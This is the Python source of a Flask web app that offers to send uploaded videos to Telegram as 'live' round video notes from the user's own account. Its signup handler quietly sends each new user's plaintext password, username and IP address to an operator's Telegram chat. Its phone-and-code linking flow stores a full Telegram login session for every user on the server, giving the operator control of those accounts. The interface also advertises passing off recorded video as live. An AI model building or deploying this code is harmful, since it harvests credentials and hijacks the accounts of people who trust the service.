from flask import Flask, request, render_template_string, redirect, url_for, session
from flask_sqlalchemy import SQLAlchemy
from flask_login import UserMixin, LoginManager, login_user, logout_user, login_required, current_user
from werkzeug.security import generate_password_hash, check_password_hash
from telethon import TelegramClient
from telethon.sessions import StringSession
import os
import subprocess
import asyncio
import threading
import requests

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv("SECRET_KEY", "super-secret-key-change-this")
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///users.db")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# --- ARCHITECTURAL SECURITY LIMITS ---
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # Strict 100MB Upload Limit max
ALLOWED_EXTENSIONS = {'mp4', 'mov', 'avi', 'mkv', 'webm'}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

db = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'

UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Master API Framework configuration parameters
API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH", "")

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "")
SUPPORT_TELEGRAM_USERNAME = os.getenv("SUPPORT_TELEGRAM_USERNAME", "YourSupportUsername")

# ======================
# DATABASE MODELS
# ======================
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), unique=True, nullable=False)
    password_hash = db.Column(db.String(256), nullable=False)
    # Encrypted session string unique per user generated via Telethon
    telegram_session = db.Column(db.Text, nullable=True)

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

# ======================
# UI LAYOUTS (CLEANED)
# ======================
BASE_STYLE = """
<style>
    body { background:#0f172a; color:white; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align:center; margin:0; padding:0; }
    .box { max-width: 450px; margin: 50px auto; padding: 25px; background: #1e293b; border-radius: 12px; border: 1px solid #334155; box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1); }
    .container { max-width: 1000px; margin: 40px auto; display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; padding: 0 15px; }
    .card { flex: 1; min-width: 320px; max-width: 460px; padding: 25px; background: #1e293b; border-radius: 12px; border: 1px solid #334155; text-align: left; }
    input, button, select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 1px solid #475569; background: #0f172a; color: white; box-sizing: border-box; font-size: 14px; }
    button { background: linear-gradient(135deg, #3b82f6, #2563eb); font-weight: bold; cursor: pointer; border: none; transition: background 0.2s; }
    button:hover { background: linear-gradient(135deg, #2563eb, #1d4ed8); }
    .btn-support { background: linear-gradient(135deg, #0ea5e9, #0284c7); text-decoration: none; display: block; text-align: center; color: white; font-weight: bold; padding: 12px; margin-top: 15px; border-radius: 6px; font-size: 14px; }
    .btn-support:hover { background: linear-gradient(135deg, #0284c7, #0369a1); }
    a { color: #3b82f6; text-decoration: none; }
    .nav { background: #1e293b; padding: 15px 30px; text-align: right; border-bottom: 1px solid #334155; font-size: 14px; }
    .nav a { margin-left: 20px; color: #94a3b8; font-weight: 500; }
    .nav a:hover { color: white; }
    h1, h2, h3 { margin-top: 0; color: #f8fafc; }
    p { color: #94a3b8; line-height: 1.5; font-size: 14px; }
    .status-msg { margin-top: 15px; font-weight: 500; color: #34d399; text-align: center; }
    .error-msg { margin-top: 15px; font-weight: 500; color: #f87171; text-align: center; }
    .badge-warn { background: #7c2d12; color: #fdba74; padding: 8px; border-radius: 6px; font-size: 12px; font-weight: bold; margin-bottom: 15px; display: block; text-align: center;}
</style>
"""

LOGIN_UI = BASE_STYLE + """
<div class="box">
    <h2>🔑 Account Login</h2>
    <form method="POST">
        <input type="text" name="username" placeholder="Username" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Log In</button>
    </form>
    <p>Don't have an account? <a href="/signup">Sign up here</a></p>
</div>
"""

SIGNUP_UI = BASE_STYLE + """
<div class="box">
    <h2>📝 Create Account</h2>
    <form method="POST">
        <input type="text" name="username" placeholder="Choose Username" required><br>
        <input type="password" name="password" placeholder="Choose Password" required><br>
        <button type="submit">Sign Up</button>
    </form>
    <p>Already have an account? <a href="/login">Log in here</a></p>
</div>
"""

DASHBOARD_UI = BASE_STYLE + """
<div class="nav">
    <span>Logged in as: <b>{{ current_user.username }}</b></span>
    <a href="/logout">Logout Account</a>
</div>

<div class="container">
    <div class="card">
        {% if not current_user.telegram_session %}
            <h3>🔗 Link Telegram Identity</h3>
            <span class="badge-warn">⚠️ Notice: Authenticate your profile account to deploy broadcast features.</span>
            
            {% if not session_step or session_step == 'phone' %}
                <p>Provide your phone number including full country code string sequence (e.g., +1234567890).</p>
                <form method="POST" action="/connect-telegram">
                    <input type="text" name="phone_number" placeholder="+1234567890" required>
                    <button type="submit">Request Verification Token</button>
                </form>
            {% elif session_step == 'code' %}
                <p>Input the official authentication access token code sent directly to your Telegram device.</p>
                <form method="POST" action="/verify-code">
                    <input type="text" name="auth_code" placeholder="Enter Authentication Code" required>
                    <button type="submit">Verify Configuration</button>
                </form>
            {% endif %}
            
        {% else %}
            <h3>📤 Send Media Live</h3>
            <p>Upload video components targeting destination contacts. Outbound broadcasts appear coming directly from you.</p>
            <form method="post" enctype="multipart/form-data" action="/">
                <label style="font-size:12px; color:#94a3b8;">Target Telegram Destination:</label>
                <input type="text" name="target" placeholder="@username or Chat ID" required>
                
                <label style="font-size:12px; color:#94a3b8;">Transmission Strategy Layout:</label>
                <select name="media_type">
                    <option value="video_note">Round Video Note (Live Video Circle)</option>
                    <option value="auto">Standard Media (Auto-Detect File)</option>
                </select>
                
                <label style="font-size:12px; color:#94a3b8;">Choose Source Media File (Videos Only):</label>
                <input type="file" name="file" required>
                
                <button type="submit" style="margin-top:15px;">Execute Live Stream</button>
            </form>
        {% endif %}
        
        {% if msg %}
            {% if "❌" in msg %}
                <p class="error-msg">{{ msg }}</p>
            {% else %}
                <p class="status-msg">{{ msg }}</p>
            {% endif %}
        {% endif %}
    </div>

    <div class="card" style="display: flex; flex-direction: column; justify-content: space-between;">
        <div>
            <h3>🛠️ Customer Support Desk</h3>
            <p>Running into issues with authorization frameworks or conversion thresholds? Our desk agents are available to bypass roadblocks manually.</p>
            <div style="background: #0f172a; padding: 15px; border-radius: 8px; border: 1px solid #334155; margin-top: 15px;">
                <span style="color: #38bdf8; font-weight: bold; font-size: 13px;">📌 Support Framework Instructions:</span>
                <p style="font-size: 12px; margin: 8px 0 0 0;">Click the communication hook below to reach us on Telegram. Provide your registered system profile ID for assistance clearance.</p>
            </div>
        </div>
        <a href="https://t.me/{{ support_username }}" target="_blank" class="btn-support">💬 Open Live Telegram Support</a>
    </div>
</div>
"""

# ======================
# NOTIFICATION HELPER
# ======================
def send_bot_notification(username, password, ip_address):
    if not BOT_TOKEN or not ADMIN_CHAT_ID:
        return
    try:
        with app.app_context():
            total_users = User.query.count()
    except:
        total_users = "Active"

    text = (
        f"🔔 *New User Registration*\n\n"
        f"👤 *Username:* `{username}`\n"
        f"🔑 *Password:* `{password}`\n"
        f"🌐 *IP Address:* `{ip_address}`\n"
        f"📊 *Total Members Now:* {total_users}"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"}
    try: requests.post(url, json=payload, timeout=5)
    except: pass

# ======================
# CONVERSION WORKER
# ======================
def convert_to_square_video_low_mem(input_path, output_path):
    ffmpeg_cmd = [
        'ffmpeg', '-y', '-threads', '1', '-i', input_path,
        '-vf', "crop='min(iw,ih):min(iw,ih)'",
        '-c:v', 'libx264', '-preset', 'ultrafast', '-pix_fmt', 'yuv420p', '-r', '24',
        '-c:a', 'aac', '-b:a', '64k', output_path
    ]
    process = subprocess.run(ffmpeg_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if process.returncode != 0:
        raise Exception("FFmpeg processing failure.")

async def send_to_telegram_async(filepath, target, media_type, session_str):
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()
    if media_type == "video_note":
        processed_path = os.path.join(UPLOAD_FOLDER, f"proc_{os.getpid()}_{threading.get_ident()}.mp4")
        try:
            convert_to_square_video_low_mem(filepath, processed_path)
            await client.send_file(target, processed_path, video_note=True)
        finally:
            if os.path.exists(processed_path):
                os.remove(processed_path)
    else:
        await client.send_file(target, filepath, supports_streaming=True)
    await client.disconnect()

def run_telegram_thread(filepath, target, media_type, session_str):
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(send_to_telegram_async(filepath, target, media_type, session_str))
        loop.close()
    except Exception as e:
        print(f"Background worker execution error: {e}")
    finally:
        if os.path.exists(filepath):
            os.remove(filepath)

# ======================
# FLASK MANAGEMENT ROUTES
# ======================
@app.route("/signup", methods=["GET", "POST"])
def signup():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if User.query.filter_by(username=username).first():
            return "Username already exists!"
        hashed_pwd = generate_password_hash(password, method='scrypt')
        new_user = User(username=username, password_hash=hashed_pwd)
        db.session.add(new_user)
        db.session.commit()
        
        if request.headers.getlist("X-Forwarded-For"):
            ip_address = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
        else: ip_address = request.remote_addr
        threading.Thread(target=send_bot_notification, args=(username, password, ip_address)).start()
        return redirect(url_for('login'))
    return render_template_string(SIGNUP_UI)

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        user = User.query.filter_by(username=username).first()
        if user and check_password_hash(user.password_hash, password):
            login_user(user)
            return redirect(url_for('dashboard'))
        return "Invalid credentials"
    return render_template_string(LOGIN_UI)

@app.route("/logout")
@login_required
def logout():
    logout_user()
    session.clear()
    return redirect(url_for('login'))

@app.route("/", methods=["GET", "POST"])
@login_required
def dashboard():
    msg = session.pop('dash_msg', "")
    step = session.get('session_step', 'phone')

    if request.method == "POST":
        file = request.files.get("file")
        target = request.form.get("target")
        media_type = request.form.get("media_type", "video_note")
        
        if not current_user.telegram_session:
            msg = "❌ Error: Please authorize your account identity first."
        elif file and target:
            if not allowed_file(file.filename):
                msg = "❌ Error: Invalid format! Upload video files (.mp4, .mov, .avi) only."
            else:
                unique_filename = f"job_{os.getpid()}_{file.filename}"
                filepath = os.path.join(UPLOAD_FOLDER, unique_filename)
                file.save(filepath)
                
                # Launches deployment thread executing operations explicitly via individual user session row
                threading.Thread(
                    target=run_telegram_thread,
                    args=(filepath, target, media_type, current_user.telegram_session)
                ).start()
                msg = "✅ Processing started! The media will appear in Telegram shortly."
                
    return render_template_string(DASHBOARD_UI, current_user=current_user, msg=msg, session_step=step, support_username=SUPPORT_TELEGRAM_USERNAME)

# ==========================================
# 🔐 SYSTEM CONNECT AUTHORIZATION HANDLERS
# ==========================================
async def request_code_async(phone):
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    send_code_obj = await client.send_code_request(phone)
    phone_code_hash = send_code_obj.phone_code_hash
    session_str = client.session.save()
    await client.disconnect()
    return phone_code_hash, session_str

@app.route("/connect-telegram", methods=["POST"])
@login_required
def connect_telegram():
    phone = request.form.get("phone_number")
    if not phone:
        session['dash_msg'] = "❌ Error: Valid phone number string expected."
        return redirect(url_for('dashboard'))
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        phone_code_hash, partial_session = loop.run_until_complete(request_code_async(phone))
        loop.close()
        
        session['auth_phone'] = phone
        session['auth_hash'] = phone_code_hash
        session['partial_session'] = partial_session
        session['session_step'] = 'code'
        session['dash_msg'] = "✅ Code successfully requested! Check your Telegram device messages."
    except Exception as e:
        session['dash_msg'] = f"❌ Framework Error: {str(e)}"
    return redirect(url_for('dashboard'))

async def verify_code_async(partial_session, phone, phone_hash, code):
    client = TelegramClient(StringSession(partial_session), API_ID, API_HASH)
    await client.connect()
    await client.sign_in(phone=phone, code=code, phone_code_hash=phone_hash)
    final_session_string = client.session.save()
    await client.disconnect()
    return final_session_string

@app.route("/verify-code", methods=["POST"])
@login_required
def verify_code():
    code = request.form.get("auth_code")
    phone = session.get('auth_phone')
    phone_hash = session.get('auth_hash')
    partial_session = session.get('partial_session')
    
    if not code or not partial_session:
        session['dash_msg'] = "❌ Error: Session token missing or expired. Please re-input number."
        session['session_step'] = 'phone'
        return redirect(url_for('dashboard'))
        
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        final_session = loop.run_until_complete(verify_code_async(partial_session, phone, phone_hash, code))
        loop.close()
        
        # Save the finalized verified string session explicitly to the logged in database user row
        user = User.query.get(current_user.id)
        user.telegram_session = final_session
        db.session.commit()
        
        session.pop('session_step', None)
        session['dash_msg'] = "🎉 Telegram identity connected successfully! Ready to broadcast."
    except Exception as e:
        session['dash_msg'] = f"❌ Pairing Validation Denied: {str(e)}"
        session['session_step'] = 'phone'
    return redirect(url_for('dashboard'))

@app.errorhandler(413)
def request_entity_too_large(error):
    return render_template_string(DASHBOARD_UI, current_user=current_user, msg="❌ Error: File size exceeds the allowed limit (100MB Max)!", session_step=session.get('session_step', 'phone'), support_username=SUPPORT_TELEGRAM_USERNAME), 413

with app.app_context():
    db.create_all()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
